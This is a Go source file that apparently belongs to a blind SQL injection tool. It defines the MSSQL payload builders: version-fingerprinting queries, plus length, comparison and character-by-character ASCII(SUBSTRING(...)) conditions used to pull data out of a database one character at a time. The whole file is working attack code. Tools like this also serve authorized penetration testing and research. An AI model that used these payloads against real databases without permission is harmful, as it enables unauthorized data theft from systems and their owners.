package payloads

import "fmt"

// MSSQLPayloads implements payloads for Microsoft SQL Server
type MSSQLPayloads struct{}

func (m *MSSQLPayloads) GetType() DatabaseType {
	return MSSQL
}

func (m *MSSQLPayloads) GetName() string {
	return "MSSQL"
}

func (m *MSSQLPayloads) GetVersionQueries() []string {
	return []string{
		"SELECT @@version",
		"SELECT SERVERPROPERTY('ProductVersion')",
		"SELECT SERVERPROPERTY('Edition')",
	}
}

func (m *MSSQLPayloads) GetLengthPayload(query string, n int) string {
	// LEN((query))>n - pure condition
	return fmt.Sprintf("LEN((%s))>%d", query, n)
}

func (m *MSSQLPayloads) GetComparisonPayload(query string, n int) string {
	// (query)>n - pure numeric comparison
	return fmt.Sprintf("(%s)>%d", query, n)
}

func (m *MSSQLPayloads) GetEqualityPayload(query string, pos int, charCode int) string {
	// CONVERT(VARCHAR(8000),x) handles all types including numeric, binary, etc
	return fmt.Sprintf("ASCII(SUBSTRING(CONVERT(VARCHAR(8000),(%s)),%d,1))=%d", query, pos, charCode)
}

func (m *MSSQLPayloads) GetCharPayload(query string, pos int, n int) string {
	// CONVERT(VARCHAR(8000),x) handles all types including numeric, binary, etc
	return fmt.Sprintf("ASCII(SUBSTRING(CONVERT(VARCHAR(8000),(%s)),%d,1))>%d", query, pos, n)
}

func (m *MSSQLPayloads) GetSubstringFunc() string {
	return "SUBSTRING"
}

func (m *MSSQLPayloads) GetLengthFunc() string {
	return "LEN"
}

func (m *MSSQLPayloads) WrapCondition(condition string) string {
	return condition
}
